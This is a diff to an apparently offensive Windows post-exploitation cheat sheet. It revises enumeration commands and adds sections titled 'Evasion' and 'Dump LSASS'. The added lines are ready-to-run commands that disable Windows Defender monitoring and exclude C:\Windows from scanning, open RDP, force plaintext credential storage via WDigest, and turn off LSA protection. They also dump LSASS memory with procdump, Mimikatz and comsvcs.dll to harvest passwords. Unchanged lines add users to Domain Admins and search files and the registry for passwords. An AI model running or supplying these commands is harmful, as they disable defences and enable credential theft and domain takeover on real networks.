@@ -38,6 +38,7 @@ netsh firewall show state
 netsh firewall show config
 
 netsh firewall add portopening TCP 3389 RDP
+
 netsh firewall set opmode disable                 Disable firewall
 
 netsh wlan show interfaces
@@ -146,24 +147,25 @@ net group "Domain Admins" <user> /add /domain     Add a user to a specific Secur
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Enumerate using a low level account
+# Situational awareness using a low level account
 
 hostname
 whoami
 whoami /groups
-systeminfo                                        Show system info, hot fixes, and domain name
+whoami /priv
+systeminfo                                        hostname, OS name and version, domain, and hot fixes
 net share                                         Shared folders
 net users                                         Local users
-net localgroup Administrators                     Local administrators
+net localgroup administrators                     Local administrators
 
 ipconfig /all
 route print
 arp -a
 netstat -ano | findstr "LISTEN"
-netstat -ano | findstr "ESTABLISH
+netstat -ano | findstr "ESTABLISH"
 
 nltest /dclist:<domain>                           Show domain controllers
-nltest /domain_trusts                             Show domain trusts
+nltest /domain_trusts /all_trusts                 Show domain trusts
 
 net group "domain admins" /domain
 net group "enterprise admins" /domain
@@ -172,10 +174,31 @@ net group "Domain Computers" /domain
 doskey /history                                   Show command history
 gpresult /z
 
-dir /s *pass* == *cred* == *vnc* == *.config*
+dir /s *password* == *cred* == *vnc*
 findstr /si password *.ini *.pdf *.txt *.docx *.xlsx
-reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Evasion
+
+Disable Windows Defender Behavior Monitoring.
+Set the Severe Threat default action to ‘Allow’.
+Disable Realtime Monitoring.
+Exclude the ‘C:\Windows’ path from scheduled and real-time scanning.
+
+try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}
+
+- Allow RDP
+netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
+
+- Start Remote Desktop Services
+net start TermService
+
+- Enabled WDigest authentication, this enforces the storage of credentials in plaintext on future logins.
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+- Disable LSA protection
+reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation
@@ -200,6 +223,20 @@ seatbelt.exe -group=system
 watson.exe
 
 winPEASx64.exe cmd
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Dump LSASS
+
+Need to be running as admin.
+
+procdump -ma lsass.exe lsass_dump
+
+- Mimikatz
+sekurlsa::Minidump lsassdump.dmp
+sekurlsa::logonPasswords
+
+- Built-in tools
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\test.dmp full | out-host; Compress-Archive C:\windows\temp\test.dmp C:\windows\temp\test.zip
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Lateral Movement
